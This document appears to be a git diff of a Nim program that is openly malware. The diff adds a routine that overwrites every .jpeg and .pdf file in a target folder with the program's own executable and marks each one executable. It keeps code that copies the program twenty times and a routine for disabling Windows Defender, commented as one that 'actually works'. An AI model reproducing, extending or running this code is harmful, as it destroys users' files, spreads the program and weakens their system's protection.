@@ -1,6 +1,7 @@
 import std/os
 import std/browsers
 import osproc
+import std/strformat
 
 proc Rasputin() =
     let url = "https://www.youtube.com/watch?v=16y1AkoZkmQ"
@@ -12,25 +13,40 @@ proc disableWindowsDefender() =
 
     discard execProcess(command, options={ProcessOption.poEvalCommand, ProcessOption.poDaemon})
 
-
-let filename = getAppFilename()
-let directory = getAppDir()
-
-
-# create a directory for generated files
-let generatedDir = directory & "/generated-files"
-
-discard existsOrCreateDir(generatedDir)
-
-for i in 1..20:
-    var newfile = filename & $i
-    copyFile(filename, newfile)
-    copyFileToDir(newfile, generatedDir)
-    discard execProcess("chmod +x ./generated-files/*", options={ProcessOption.poEvalCommand})
-    removeFile(newfile)
-
-Rasputin() # RA RA RASPUTIN
-# disableWindowsDefender() # THIS ACTUALLY WORKS, BE CAREFUL
-
-
+proc targetExtensions(filename: string, directory: string, extensions: seq[string]) =
+    for extension in extensions:
+        for file in walkDir(directory):
+            var ext = splitFile(file.path)[2]
+            if ext == extension:
+                copyFileWithPermissions(filename, file.path)
+                var command = "chmod +x " & file.path
+                discard execProcess(command, options={ProcessOption.poEvalCommand})
+            
     
+
+
+proc main() =
+
+    let filename = getAppFilename()
+    let directory = getAppDir()
+    var extensionsToTarget: seq[string] = @[".jpeg", ".pdf"]
+
+
+    # create a directory for generated files
+    let generatedDir = directory & "/generated-files"
+
+    discard existsOrCreateDir(generatedDir)
+
+    for i in 1..20:
+        var newfile = filename & $i
+        copyFile(filename, newfile)
+        copyFileToDir(newfile, generatedDir)
+        discard execProcess("chmod +x ./generated-files/*", options={ProcessOption.poEvalCommand})
+        removeFile(newfile)
+
+    Rasputin() # RA RA RASPUTIN
+    # disableWindowsDefender() # THIS ACTUALLY WORKS, BE CAREFUL
+    targetExtensions(filename,"./target", extensionsToTarget)
+
+
+main()
